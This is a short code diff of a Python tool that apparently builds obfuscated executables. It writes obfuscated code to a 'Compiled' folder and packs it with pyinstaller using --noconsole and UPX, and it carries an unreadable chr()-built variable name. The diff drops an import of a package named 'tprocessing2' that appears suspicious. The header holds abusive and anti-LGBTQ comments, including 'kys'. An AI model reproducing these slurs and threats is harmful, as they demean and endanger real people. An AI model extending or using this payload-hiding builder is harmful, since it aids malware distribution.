@@ -1,6 +1,6 @@
 # If you dont like how I code, idgaf, kys - vesper & NTX
 # We do not svpp0rt LGBTQ
-import os, webbrowser, Rungui, requests, random, string, base64, marshal, pickle, zlib, shutil, codecs, lzma, gzip, tprocessing2
+import os, webbrowser, Rungui, requests, random, string, base64, marshal, pickle, zlib, shutil, codecs, lzma, gzip
 from time import sleep
 from PIL import ImageTk, ImageSequence
 from tkinter import *
@@ -409,7 +409,7 @@ S1MP13____4SS_STR1N6_____WTF___1S____TH15_BR0_______WTFFF___=__import__(f"{chr(9
             with open(f"Compiled/{name}.py","w+") as f:f.write(obf_content);f.close()
     
     def _Compile(self, icon, name):
-        UPX = tprocessing2.ongetprocess("upx")
+        UPX = "./utils"
         if icon == "":
             os.system(f"pyinstaller --onefile --name {name} --noconsole --upx-dir={UPX} --clean Compiled/{name}.py")
         else:
